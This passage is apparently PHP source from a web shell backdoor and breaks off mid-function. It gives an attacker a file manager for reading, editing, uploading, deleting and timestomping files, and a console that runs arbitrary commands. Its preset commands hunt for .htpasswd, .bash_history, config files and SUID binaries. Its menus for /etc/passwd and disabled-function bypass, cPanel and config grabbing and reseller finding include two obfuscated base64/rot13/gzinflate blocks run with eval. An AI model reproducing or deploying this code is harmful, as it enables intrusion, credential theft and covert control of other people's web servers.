            header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
            if (function_exists("mime_content_type")) {
                $type = @mime_content_type($_POST['p1']);
                header("Content-Type: " . $type);
            } else
                header("Content-Type: application/octet-stream");
            $fp = @fopen($_POST['p1'], "r");
            if($fp) {
                while(!@feof($fp))
                    echo @fread($fp, 1024);
                fclose($fp);
            }
        }exit;
    }
    if( @$_POST['p2'] == 'mkfile' ) {
        if(!file_exists($_POST['p1'])) {
            $fp = @fopen($_POST['p1'], 'w');
            if($fp) {
                $_POST['p2'] = "edit";
                fclose($fp);
            }
        }
    }
    hardHeader();
    echo '<h1>File tools</h1><div class=content>';
    if( !file_exists(@$_POST['p1']) ) {
        echo 'File not exists';
        hardFooter();
        return;
    }
    $uid = @posix_getpwuid(@fileowner($_POST['p1']));
    if(!$uid) {
        $uid['name'] = @fileowner($_POST['p1']);
        $gid['name'] = @filegroup($_POST['p1']);
    } else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
    echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
    echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
    if( empty($_POST['p2']) )
        $_POST['p2'] = 'view';
    if( is_file($_POST['p1']) )
        $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');
    else
        $m = array('Chmod', 'Rename', 'Touch');
    foreach($m as $v)
        echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
    echo '<br><br>';
    switch($_POST['p2']) {
        case 'view':
            echo '<pre class=ml1>';
            $fp = @fopen($_POST['p1'], 'r');
            if($fp) {
                while( !@feof($fp) )
                    echo htmlspecialchars(@fread($fp, 1024));
                @fclose($fp);
            }
            echo '</pre>';
            break;
        case 'highlight':
            if( @is_readable($_POST['p1']) ) {
                echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
                $oRb = @highlight_file($_POST['p1'],true);
                echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$oRb).'</div>';
            }
            break;
        case 'chmod':
            if( !empty($_POST['p3']) ) {
                $perms = 0;
                for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
                    $perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
                if(!@chmod($_POST['p1'], $perms))
                    echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
            }
            clearstatcache();
            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value="submit"></form>';
            break;
        case 'edit':
            if( !is_writable($_POST['p1'])) {
                echo 'File isn\'t writeable';
                break;
            }
            if( !empty($_POST['p3']) ) {
                $time = @filemtime($_POST['p1']);
                $_POST['p3'] = substr($_POST['p3'],1);
                $fp = @fopen($_POST['p1'],"w");
                if($fp) {
                    @fwrite($fp,$_POST['p3']);
                    @fclose($fp);
                    echo 'Saved!<br><script>p3_="";</script>';
                    @touch($_POST['p1'],$time,$time);
                }
            }
            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
            $fp = @fopen($_POST['p1'], 'r');
            if($fp) {
                while( !@feof($fp) )
                    echo htmlspecialchars(@fread($fp, 1024));
                @fclose($fp);
            }
            echo '</textarea><input type=submit value="submit"></form>';
            break;
        case 'hexdump':
            $c = @file_get_contents($_POST['p1']);
            $n = 0;
            $h = array('00000000<br>','','');
            $len = strlen($c);
            for ($i=0; $i<$len; ++$i) {
                $h[1] .= sprintf('%02X',ord($c[$i])).' ';
                switch ( ord($c[$i]) ) {
                    case 0:  $h[2] .= ' '; break;
                    case 9:  $h[2] .= ' '; break;
                    case 10: $h[2] .= ' '; break;
                    case 13: $h[2] .= ' '; break;
                    default: $h[2] .= $c[$i]; break;
                }
                $n++;
                if ($n == 32) {
                    $n = 0;
                    if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
                    $h[1] .= '<br>';
                    $h[2] .= "\n";
                }
             }
            echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#000000><pre>'.$h[1].'</pre></td><td bgcolor=#202832><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
            break;
        case 'rename':
            if( !empty($_POST['p3']) ) {
                if(!@rename($_POST['p1'], $_POST['p3']))
                    echo 'Can\'t rename!<br>';
                else
                    die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
            }
            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value="submit"></form>';
            break;
        case 'touch':
            if( !empty($_POST['p3']) ) {
                $time = strtotime($_POST['p3']);
                if($time) {
                    if(!touch($_POST['p1'],$time,$time))
                        echo 'Fail!';
                    else
                        echo 'Touched!';
                } else echo 'Bad time format!';
            }
            clearstatcache();
            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="submit"></form>';
            break;
        /* (С) 12.2015 mitryz */
        case 'frame':
            $frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
            if ($frameSrc[0] != '/')
                $frameSrc = '/' . $frameSrc;
            if ($frameSrc[strlen($frameSrc) - 1] != '/')
                $frameSrc = $frameSrc . '/';
            $frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);
            echo '<iframe width="100%" height="900px" scrolling="no" src='.$frameSrc.' onload="onload=height=contentDocument.body.scrollHeight"></iframe>';
            break;
    }
    echo '</div>';
    hardFooter();
}
if($os == 'win')
    $aliases = array(
        "List Directory" => "dir",
        "Find index.php in current dir" => "dir /s /w /b index.php",
        "Find *config*.php in current dir" => "dir /s /w /b *config*.php",
        "Show active connections" => "netstat -an",
        "Show running services" => "net start",
        "User accounts" => "net user",
        "Show computers" => "net view",
        "ARP Table" => "arp -a",
        "IP Configuration" => "ipconfig /all"
    );
else
    $aliases = array(
          "List dir" => "ls -lha",
        "list file attributes on a Linux second extended file system" => "lsattr -va",
          "show opened ports" => "netstat -an | grep -i listen",
        "process status" => "ps aux",
        "Find" => "",
          "find all suid files" => "find / -type f -perm -04000 -ls",
          "find suid files in current dir" => "find . -type f -perm -04000 -ls",
          "find all sgid files" => "find / -type f -perm -02000 -ls",
          "find sgid files in current dir" => "find . -type f -perm -02000 -ls",
          "find config.inc.php files" => "find / -type f -name config.inc.php",
          "find config* files" => "find / -type f -name \"config*\"",
          "find config* files in current dir" => "find . -type f -name \"config*\"",
          "find all writable folders and files" => "find / -perm -2 -ls",
          "find all writable folders and files in current dir" => "find . -perm -2 -ls",
          "find all service.pwd files" => "find / -type f -name service.pwd",
          "find service.pwd files in current dir" => "find . -type f -name service.pwd",
          "find all .htpasswd files" => "find / -type f -name .htpasswd",
          "find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
          "find all .bash_history files" => "find / -type f -name .bash_history",
          "find .bash_history files in current dir" => "find . -type f -name .bash_history",
          "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
          "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
        "Locate" => "",
          "locate httpd.conf files" => "locate httpd.conf",
        "locate vhosts.conf files" => "locate vhosts.conf",
        "locate proftpd.conf files" => "locate proftpd.conf",
        "locate psybnc.conf files" => "locate psybnc.conf",
        "locate my.conf files" => "locate my.conf",
        "locate admin.php files" =>"locate admin.php",
        "locate cfg.php files" => "locate cfg.php",
        "locate conf.php files" => "locate conf.php",
        "locate config.dat files" => "locate config.dat",
        "locate config.php files" => "locate config.php",
        "locate config.inc files" => "locate config.inc",
        "locate config.inc.php" => "locate config.inc.php",
        "locate config.default.php files" => "locate config.default.php",
        "locate config* files " => "locate config",
        "locate .conf files"=>"locate '.conf'",
        "locate .pwd files" => "locate '.pwd'",
        "locate .sql files" => "locate '.sql'",
        "locate .htpasswd files" => "locate '.htpasswd'",
        "locate .bash_history files" => "locate '.bash_history'",
        "locate .mysql_history files" => "locate '.mysql_history'",
        "locate .fetchmailrc files" => "locate '.fetchmailrc'",
        "locate backup files" => "locate backup",
        "locate dump files" => "locate dump",
        "locate priv files" => "locate priv"
    );
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
    if(isset($_POST['ajax'])) {
        prototype(md5($_SERVER['HTTP_HOST']).'ajax', true);
        ob_start();
        echo "d.cf.cmd.value='';\n";
        $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\'\0"));
        if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))    {
            if(@chdir($match[1])) {
                $GLOBALS['cwd'] = @getcwd();
                echo "c_='".$GLOBALS['cwd']."';";
            }
        }
        echo "d.cf.output.value+='".$temp."';";
        echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
        $temp = ob_get_clean();
        echo strlen($temp), "\n", $temp;
        exit;
    }
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
        prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
    hardHeader();
    echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
    var n = (window.Event) ? e.which : e.keyCode;
    if(n == 38) {
        cur--;
        if(cur>=0)
            document.cf.cmd.value = cmds[cur];
        else
            cur++;
    } else if(n == 40) {
        cur++;
        if(cur < cmds.length)
            document.cf.cmd.value = cmds[cur];
        else
            cur--;
    }
}
function add(cmd) {
    cmds.pop();
    cmds.push(cmd);
    cmds.push('');
    cur = cmds.length-1;
}
</script>";
    echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><label><select name=alias>';
    foreach($GLOBALS['aliases'] as $n => $v) {
        if($v == '') {
            echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
            continue;
        }
        echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
    }
    echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
    if(!empty($_POST['p1'])) {
        echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
    }
    echo '</textarea><table style="border:1px solid #000000;background-color:#000000;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
    echo '</form></div><script>d.cf.cmd.focus();</script>';
    hardFooter();
}
function actionbypas() {
    hardHeader();
    echo "<center><h1>Bypass Tools</h1><div class=content><br>";

    echo"<th><a href='#' onclick='g(\"passw\",null,\"s_name_".($sort[1]?0:1)."\")'> >>> Bypass: /etc/passwd <<< </a></th><p>";
    echo"<th><a href='#' onclick='g(\"disable\",null,\"s_name_".($sort[1]?0:1)."\")'> >>> Bypass: Disbaled Functions <<< </a></th>";
    echo '</div>';
    hardFooter();
}
function actionpassw() {
    hardHeader();
    echo "<center><h1>Bypass: /etc/passwd</h1><div class=content><br>";

    echo "<br><center>  <iframe src='?passwd' width='900' height='400'></iframe></a>";
    echo '</div>';
    hardFooter();
}
function actiondisable() {
    hardHeader();
    echo "<center><h1>Bypass: Disabled Functions</h1><div class=content><br>";
    echo "<br><center>  <iframe src='?disabled' width='900' height='300'></iframe></a>";
    echo '</div>';
    hardFooter();
}
function actionPhp() {
    hardHeader();
    echo "<center><h1>Grab Cpanel</h1><div class=content><br>";
    $hex = "tUrvYto4GP5eqf+DlyElXGZWoLfTUwkbR5R3H6qWYZO6XoXinO0UupA4w3jY+r/feJtA+NECpzvUCm8/fv368XA/Yj6IQAwodJaZChrm8cOAE4IJNXqvbWVrkFJOwgQOEA8Y4fX7ukhufMTsyjQmf1Q8Ikp8HLEbwYNS07UIZ4PweNWfhwcIPpWYaz4fhTlBubVuMEVu5YwzZ3odXcRIwWEr4q6AE84iEiBTxNSSUGI91fVna8CTCVNzZllN8t88mbcksB6uWyqpN41SQJGPPnEi55bpZZa4TjzlqZPgIDOrCoULFFriIBXEMtz7mHWcISEiUNYchgkqAkoPDwoWtgeRMJHN40fRz0zOU5PF45yjOBffA3+Wf5PJ/wm6160MhwglbFmpQtlQzustZ9k5YvdD03KTSGALXWi+Xnx2YuwsBwHk+Uy/uwvuFJ6GmKS7YJ3pg5ME2QzqwlcMyWaCo4D5NVJsAlFs8kouKHuBtAwTHicTWONvTRAt1QdxRVNPWQtBesNWx1NI9s1NcXFTBoSD/hPYf+g3etO0iygyAzwMOAEgBBKjwWrOwm4kRVgKU2hOQUU1Zbkx5dQ1nG+0SY8g32C06UHwlLumo+PdmmUN5p1wujM2lCDDGIjzEVmSDEarkJagkG6cVxFLKl5IiSPB4YN+tpEJgeVgiLc+hcNTWVg59HLaZRED0DcDKUR416GzDfYX9051m/NJA2szFLLQrNR0TUmB2n9/DHXgs0QPVIjiXKR1OBGMn6ChVdmkgXfH76B0VsrAqNLG0ZFwgFzSzYGXApygdOZOK295xnVPa+ZCGAsb7m/zHKNE997WEYsJsOUPxmwcPLZX3Vo3Ye2ZWQN6VsZL5X/f5e4yULFyLwV/jjzdW55sQeBt7kU7K/xd5iJsUZ854Qv65uc/Wo6O5DeNkoRGbewb65vyeH2aX1h4+ivQaok8U1ZR8gG4HEYnVj2B3+GQTNBio8vz7lrntDeAL7uYdzg8ps6QuvjRCSehsXbcfBjcjBef+u2een7F31Gex+4bx1DWVBGka1URXL5inNoJIveN2lvHq6JCPGzEYd2rbPBKUNcCdcMjSmmaLyZr2jnr2ai2FWb9pX9maHMbhNModLAjcLiQ/vxwwINR2XZOefXFVdedm5vOx5vO5VLvWKf9zLwFuNvvnWrbve5S++y637VfzvFm/+IKQDpvchxymbpLFZ6PayLRM/t+Kpu4q/xCWzbDLM5uEKhSbeYCRvL1J55G/mZKf5/7rreH767a65qlrjjnBoPczwenY2F8FBMSP0tYxkqsRGyfSmvfeUQf4KR9F5b5DQdcupruLwDyEwJgMI1MMhnEbGGZryUUGZbzW9VrPR9FNsRvcZZUZ2+VW7Th5jywZ06mx9zW7nFMSVKtbWxvSBXBqmHv1GGWoKWIQvqnSVCZg04UCCgNLdmm1BREssRCJZ0GmwmTRCRMS+20V1AEGUkq2cPjZGhes8LcbRUqQWQzFb2QiO7FTdo6/ymcQ04xgSMCw3qJ0nbLd6ckSWizpSULQZ+Rwaz6TCxX8kRH0nNQYXJW7VJuUWHf3NmmLFrM6nyoGq4nuwWEaqfSl9CTpf3IfSXNH1er81nkQchHiIq3Xv+Q/6fmIfvVOeS/rXqWXGmDWGErbraNB5ddZdK1ogVRSfnxe1oWlC1m6Rk9Sql5m0ax9K+y3U1y7LBctUDTQzmonSoIMDUD5kHFBE35rF9NZsHnfiV/7zV3m/p+eQz2tNy0/rjVv1diqam4n9Gi7XsPukOrp6Imp2TAZmcNT5O3BOyfms2BDCbH8j0YueU34SXLR15NGOdZ5qsptZqi1czgPKEE55j4r7Ps3TvPePW73UG36coe9ba9CbNrYpsB5XvyJuCyUBfgNnPoT0gvAqh81WchExfyRpv9hN63/gE=";
eval(str_rot13(gzinflate(str_rot13(base64_decode(($hex)))))); 
    echo" </div>";
    hardFooter();
}
function actionReseller() {
    hardHeader();
    echo "<center><h1>WHM & Reseller Finder</h1><div class=content><br>";
    echo "<br><center>  <iframe src='?reseller' width='900' height='470'></iframe></a>";
    echo '</div>';
    hardFooter();
}
function actionFilesMan() {
    if (!empty ($_COOKIE['f']))
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
    if(!empty($_POST['p1'])) {
        switch($_POST['p1']) {
            case 'uploadFile':
                if ( is_array($_FILES['f']['tmp_name']) ) {
                    foreach ( $_FILES['f']['tmp_name'] as $i => $tmpName ) {
                        if(!@move_uploaded_file($tmpName, $_FILES['f']['name'][$i])) {
                                echo "Can't upload file!";
                            }
                        }
                    }
                break;
            case 'mkdir':
                if(!@mkdir($_POST['p2']))
                    echo "Can't create new dir";
                break;
            case 'delete':
                function deleteDir($path) {
                    $path = (substr($path,-1)=='/') ? $path:$path.'/';
                    $dh  = opendir($path);
                    while ( ($▟ = readdir($dh) ) !== false) {
                        $▟ = $path.$▟;
                        if ( (basename($▟) == "..") || (basename($▟) == ".") )
                            continue;
                        $type = filetype($▟);
                        if ($type == "dir")
                            deleteDir($▟);
                        else
                            @unlink($▟);
                    }
                    closedir($dh);
                    @rmdir($path);
                }
                if(is_array(@$_POST['f']))
                    foreach($_POST['f'] as $f) {
                        if($f == '..')
                            continue;
                        $f = urldecode($f);
                        if(is_dir($f))
                            deleteDir($f);
                        else
                            @unlink($f);
                    }
                break;
            case 'paste':
                if($_COOKIE['act'] == 'copy') {
                    function copy_paste($c,$s,$d){
                        if(is_dir($c.$s)){
                            mkdir($d.$s);
                            $h = @opendir($c.$s);
                            while (($f = @readdir($h)) !== false)
                                if (($f != ".") and ($f != ".."))
                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
                        } elseif(is_file($c.$s))
                            @copy($c.$s, $d.$s);
                    }
                    foreach($_COOKIE['f'] as $f)
                        copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);
                } elseif($_COOKIE['act'] == 'move') {
                    function move_paste($c,$s,$d){
                        if(is_dir($c.$s)){
                            mkdir($d.$s);
                            $h = @opendir($c.$s);
                            while (($f = @readdir($h)) !== false)
                                if (($f != ".") and ($f != ".."))
                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
                        } elseif(@is_file($c.$s))
                            @copy($c.$s, $d.$s);
                    }
                    foreach($_COOKIE['f'] as $f)
                        @rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);
                } elseif($_COOKIE['act'] == 'zip') {
                    if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            chdir($_COOKIE['c']);
                            foreach($_COOKIE['f'] as $f) {
                                if($f == '..')
                                    continue;
                                if(@is_file($_COOKIE['c'].$f))
                                    $zip->addFile($_COOKIE['c'].$f, $f);
                                elseif(@is_dir($_COOKIE['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS));
                                    foreach ($iterator as $key=>$value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
                } elseif($_COOKIE['act'] == 'unzip') {
                    if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_COOKIE['f'] as $f) {
                            if($zip->open($_COOKIE['c'].$f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
                } elseif($_COOKIE['act'] == 'tar') {
                    chdir($_COOKIE['c']);
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    ex('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
                }
                unset($_COOKIE['f']);
                setcookie('f', '', time() - 3600);
                break;
            default:
                if(!empty($_POST['p1'])) {
                    prototype('act', $_POST['p1']);
                    prototype('f', serialize(@$_POST['f']));
                    prototype('c', @$_POST['c']);
                }
                break;
        }
    }
    hardHeader();
    echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
    $dirContent = hardScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
    if($dirContent === false) {    echo 'Can\'t open this folder!';hardFooter(); return; }
    global $sort;
    $sort = array('name', 1);
    if(!empty($_POST['p1'])) {
        if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
            $sort = array($match[1], (int)$match[2]);
    }
echo "<script>
    function sa() {
        for(i=0;i<d.files.elements.length;i++)
            if(d.files.elements[i].type == 'checkbox')
                d.files.elements[i].checked = d.files.elements[0].checked;
    }
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
    $dirs = $files = array();
    $n = count($dirContent);
    for($i=0;$i<$n;$i++) {
        $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
        $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
        $tmp = array('name' => $dirContent[$i],
                     'path' => $GLOBALS['cwd'].$dirContent[$i],
                     'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
                     'perms' => viewPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
                     'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
                     'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
                     'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
                    );
        if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
            $files[] = array_merge($tmp, array('type' => 'file'));
        elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
            $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
        elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&&($dirContent[$i] != "."))
            $dirs[] = array_merge($tmp, array('type' => 'dir'));
    }
    $GLOBALS['sort'] = $sort;
    function cmp($a, $b) {
        if($GLOBALS['sort'][0] != 'size')
            return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
        else
            return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
    }
    usort($files, "cmp");
    usort($dirs, "cmp");
    $files = array_merge($dirs, $files);
    $l = 0;
    foreach($files as $f) {
        echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
            .'</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a class="tooltip" data-tooltip="Frame" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'frame\')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
        $l = $l?0:1;
    }
    echo "<tr id=fak><td colspan=7>
    <input type=hidden name=ne value=''>
    <input type=hidden name=a value='FilesMan'>
    <input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
    <input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
    <label><select name='p1'>";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
        echo "<option value='paste'>↳ Paste</option>";
    echo "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    if(class_exists('ZipArchive'))
        echo "<option value='zip'>+ zip</option><option value='unzip'>- zip</option>";
    echo "<option value='tar'>+ tar.gz</option>";
    echo "</select></label>";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
        echo "&nbsp;file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
    echo "<input type='submit' value='submit'></td></tr></form></table></div>";
    hardFooter();
}
function actionStringTools() {
    hardHeader();
    echo "<center><h1>Jumping ;D</h1><div class=content><br>";
    $hex = "tUhaYptAED1Gqf9uVywtNJFWD70kQKJJiZWe2lXpxbIQi2mX2NECeLMJNP7vneXDxqYf6qGWDMvOzJs3YnRgoiGA88u3Yqx4HeuIK+GQT/OkkkKRb4wyQc7g3DUOKi8p2H7CR+gX+hHyV2UekE2yjY4v4HCyApkKbVZP27hClMgRe1oTFTu2h0JeggHLwj4Dm9kuQwaFSY7tr3YsIKcVcsGy1E+FX3JZBDAlCxjE+Z5kDO2GDDpJypm0FpNzowRqWUHXhR/oYOn13hwAIfD6Cu8ah9be1/OP2VpleAuq4qrDTk42RC1SXlOyqhziOdP3Su7F6sJQ6ToKuFW5b9FmTSc63jQlS9aab5a8Zw558w8LkLzzfyl2dOlMWwfORKEZSWJ7Ja2VahzjJXZJ6TwqUl21xBtMNI9ZaDIzCh6jubtR1lGfnl7263S2NInmcL1hOnYW4FgomU0H5CqRogxT2CQcU3RIqsKRQgfmezLsKWqcl1mLv2X+I9Ev/53ptrs3vXKoDFdLp2QuNI0jtdIcm5UklOtIhI2bLEZdkIMqCk1YHTfpWWpwsxvHKMeMKsbgaaBvTKtvipt4nAqrDzadfxBi2n8A3mg+BCE4MJbpO+TNBAj5okCUCk0sMMm6msH1M7av+mMerPFZ2Cfeo3Et3Wk8plJpgi+CIc/dE2Ibfoe+n5OhvZ+T4mxL2tFrpKxP+Q6Faa6NnGcZK9bJ+CgrLbniHoLZ7iDxL9FTe2ZvCiOLTpw5gmR18PupHp9YGiIb31hUb+MvUD1eBhvb3WW36hfHVNO99YaInXh7eK7mb/6mDHprnyNEMJsDtD3SjApMgT2d6KkN3zRGuaDsCTdD8pJlkT0ZgZxWZ3t/Zmp/MycPs9nn6OHT7Yws3KndENnuvzAefl1jrMyHxpjgKvwJ";
    eval(str_rot13(gzinflate(str_rot13(base64_decode(($hex))))));
    echo "</div>";
    hardFooter();
}

function actionSafeMode() {
    hardHeader();
    echo "<center><h1>Config Grabber</h1><div class=content><br>";
    @ini_set('display_errors', 0);
    $cgi_dir = mkdir('priv_sym', 0755);
        chdir('priv_sym');
    $file_mass = "conf.php";
